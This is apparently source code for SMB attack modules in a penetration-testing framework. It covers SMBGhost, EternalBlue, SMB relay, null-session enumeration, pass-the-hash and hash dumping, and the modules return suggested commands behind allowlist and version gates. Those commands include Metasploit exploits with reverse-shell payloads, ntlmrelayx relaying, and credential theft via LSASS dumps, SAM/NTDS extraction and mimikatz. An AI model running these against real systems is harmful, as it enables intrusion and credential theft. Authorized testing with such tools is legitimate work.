"""Attack modules: network_smb."""

from __future__ import annotations

from typing import Any

from tools.attack_modules.base import AttackModule, ModuleContext


class SMBGhost(AttackModule):
    name = "SMBGhost"
    description = "SMBv3 compression RCE (CVE-2020-0796)"
    target_services = ["microsoft-ds", "smb", "netbios-ssn"]
    target_ports = [445, 139]
    required_cves = ["CVE-2020-0796"]
    # Phase 3: version-gated -- only Win10 1903/1909 builds <18362.720 /
    # <18363.720 are vulnerable. Declaring target_versions earns the +25
    # bonus (base.py) when recon fingerprints a vulnerable build, and the
    # version gate prevents firing at patched hosts.
    target_versions = {
        "microsoft-ds": ["10.0 18362", "10.0 18363", "1903", "1909"],
        "smb": ["10.0 18362", "10.0 18363"],
    }
    # Capability metadata: SMBGhost detection-only (crash risk acknowledged).
    requires = []
    produces = ["shell", "foothold"]
    read_only = True
    cost = "medium"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "SMBv3.1.1 compression RCE (CVE-2020-0796). Affects Win10 "
                "1903/1909 builds <18362.720 / <18363.720 only. Detection via "
                "SMB2 NEGOTIATE with SMB2_FLAGS_COMPRESSED; exploitation via "
                "the kernel-mode SMBGhost exploit."
            ),
            evidence=[f"SMBGhost (CVE-2020-0796) applicable to {ctx.target_ip}"],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2020-0796",
                "https://github.com/ZecOps/CVE-2020-0796-RCE-POC",
            ],
            suggested_command=(
                f"nmap --script smb-protocols -p 445 {ctx.target_ip} && "
                f"nmap --script smb2-security-mode -p 445 {ctx.target_ip}"
            ),
            suggested_msf=(
                f"exploit/windows/smb/cve_2020_0796_smbghost RHOSTS={ctx.target_ip} "
                f"PAYLOAD=windows/x64/meterpreter/reverse_tcp LHOST=<op_callback> LPORT=4444"
            ),
        )


class EternalBlue(AttackModule):
    name = "EternalBlue"
    description = "SMBv1 MS17-010 RCE (CVE-2017-0144)"
    target_services = ["microsoft-ds", "smb", "netbios-ssn"]
    target_ports = [445, 139]
    required_cves = ["CVE-2017-0144"]
    # Phase 3: version-gated -- Win XP/7/Server 2003/2008/2008R2 only.
    target_versions = {
        "microsoft-ds": ["windows xp", "windows 7", "2003", "2008", "2008 r2"],
        "smb": ["6.1.7600", "6.0.6001", "6.0.6002", "5.1", "5.2"],
    }
    # Capability metadata: EternalBlue RCE -> foothold (lands as SYSTEM).
    requires = []
    produces = ["shell", "foothold"]
    read_only = False
    cost = "high"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "SMBv1 MS17-010 RCE (CVE-2017-0144). Would land as SYSTEM if the "
                "MSF module succeeds — this recipe only checks applicability, it "
                "does not execute. Affects unpatched Win XP/7/Server 2003/2008/2008R2 only."
            ),
            evidence=[f"EternalBlue (CVE-2017-0144) check queued against {ctx.target_ip} (not executed)"],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2017-0144",
                "https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/",
            ],
            suggested_msf=(
                f"exploit/windows/smb/ms17_010_eternalblue RHOSTS={ctx.target_ip} "
                f"PAYLOAD=windows/x64/meterpreter/reverse_tcp LHOST=<op_callback> LPORT=4444"
            ),
            confidence=0.4,
        )


class SMBRelay(AttackModule):
    name = "SMBRelay"
    description = "SMB relay attack via impacket ntlmrelayx"
    target_services = ["microsoft-ds", "smb", "netbios-ssn"]
    target_ports = [445, 139]
    required_cves = []
    # Capability metadata: SMB relay captures hashes (no foothold needed to start).
    requires = []
    produces = ["hash_artifact", "credentials"]
    read_only = False
    cost = "medium"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "SMB relay via impacket ntlmrelayx. Requires SMB signing DISABLED "
                "on the relay target (check with SMBSigningCheck first) and the "
                "relay victim in the operator allowlist. Prefer the ResponderRelay "
                "module (ad.py) which gates relay targets through the allowlist lock."
            ),
            evidence=[f"SMB relay candidate: {ctx.target_ip} (signing state unverified)"],
            references=[
                "https://www.thehacker.recipes/a-d/movement/ntlm/relay",
                "https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py",
            ],
            suggested_command=(
                "ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami' "
                "# relay victim must be in exploit.allowed_targets"
            ),
            prerequisites=["SMB signing disabled on relay target", "relay victim allowlisted"],
        )


class SMBNullSession(AttackModule):
    name = "SMBNullSession"
    description = "Enumerate SMB shares and users via null session"
    target_services = ["microsoft-ds", "smb", "netbios-ssn"]
    target_ports = [445, 139]
    required_cves = []
    # Capability metadata: null session enumeration (read-only).
    requires = []
    produces = ["user_list"]
    read_only = True
    cost = "low"
    phase_hint = "enumerate"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Attempts null session enumeration of shares, users, and groups.",
            # Phase 3: on a successful null session the anonymous bind is a
            # credential finding -- record it so record_success surfaces it.
            "credentials_found": ["anonymous:"],
            "evidence": [f"null session enumeration against {ctx.target_ip}"],
            "references": [
                "https://www.thehacker.recipes/a-d/movement/smb/null-session",
                "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb.html",
            ],
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f"""import subprocess, sys, json
host = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
results = {{"shares": [], "users": [], "groups": []}}
# smbclient share enumeration
try:
    out = subprocess.run(["smbclient", "-L", f"//{{host}}/", "-N", "-g"], capture_output=True, text=True, timeout=30)
    for line in out.stdout.splitlines():
        if line.startswith("|"):
            parts = line.strip("|").strip().split()
            if parts and parts[0] not in ("Sharename", "--------", "", "IPC$"):
                results["shares"].append(parts[0])
except Exception as e:
    results["error"] = str(e)
print(json.dumps(results))
"""


# ---------------------------------------------------------------------------
# Web Exploitation Modules
# ---------------------------------------------------------------------------


class PassTheHash(AttackModule):
    name = "PassTheHash"
    description = "Execute commands via NTLM hash (no plaintext needed) using impacket wmiexec/psexec/smbexec"
    target_services = ["smb", "microsoft-ds"]
    target_ports = [445]
    required_cves = []
    # Capability metadata: pass-the-hash consumes creds to land a shell.
    requires = ["credentials"]
    produces = ["shell", "foothold"]
    read_only = False
    cost = "medium"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Pass-the-Hash via impacket (wmiexec/psexec/smbexec/atexec). "
                "Linux-attacker only; on Windows use mimikatz sekurlsa::pth or "
                "runas /netonly. Prefer the lateral_exec MCP tool form which "
                "wraps impacket with argv safety + allowlist gating."
            ),
            evidence=[f"PtH recipe queued against {ctx.target_ip} (hash required, not executed)"],
            references=[
                "https://www.thehacker.recipes/a-d/movement/ntlm/pth",
                "https://github.com/fortra/impacket",
            ],
            suggested_command=(
                f"lateral_exec(target_ip='{ctx.target_ip}', method='wmiexec', "
                f"username='Administrator', ntlm_hash='<NT_HASH>')"
            ),
            prerequisites=["NTLM hash (LM:NT format)", "SMB port 445 open", "admin share accessible"],
            confidence=0.4,
        )


class DumpHashes(AttackModule):
    name = "DumpHashes"
    description = "SAM/SYSTEM extraction, LSASS memory dump, NTDS.dit extraction for offline cracking"
    target_services = ["smb", "microsoft-ds"]
    target_ports = [445]
    required_cves = []
    # Capability metadata: hash dumping needs admin/foothold, produces hash artifacts.
    requires = ["admin_priv"]
    produces = ["hash_artifact", "credentials"]
    read_only = False
    cost = "medium"
    phase_hint = "loot"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Extracts password hashes from compromised Windows hosts for "
                "offline cracking or PtH. Prefer the dump_credentials MCP tool "
                "(secretsdump/sam_local/lsass/mimikatz/dcsync). Parse "
                "'<user>:<uid>:<NTLM>:' lines from its output into credentials_found."
            ),
            evidence=[f"hash dump planned against {ctx.target_ip} (requires admin/SYSTEM)"],
            references=[
                "https://www.thehacker.recipes/a-d/movement/credentials/dumping",
                "https://github.com/fortra/impacket/blob/master/examples/secretsdump.py",
            ],
            suggested_command=(
                f"dump_credentials(target_ip='{ctx.target_ip}', method='secretsdump', "
                f"username='<admin>', ntlm_hash='<NT>')"
            ),
            techniques=[
                {"name": "SAM dump", "command": "impacket-secretsdump -sam SAM -system SYSTEM LOCAL"},
                {"name": "LSASS dump", "command": "procdump.exe -accepteula -ma lsass.exe lsass.dmp"},
                {"name": "NTDS.dit", "command": "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"},
                {
                    "name": "Registry save",
                    "command": "reg save HKLM\\SAM sam.save && reg save HKLM\\SYSTEM system.save",
                },
                {"name": "Mimikatz", "command": "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit"},
            ],
            prerequisites=["Administrator/SYSTEM access on target", "Ability to upload/execute tools"],
        )


# ---------------------------------------------------------------------------
# AI-Assisted Exploit Synthesis Modules
# ---------------------------------------------------------------------------
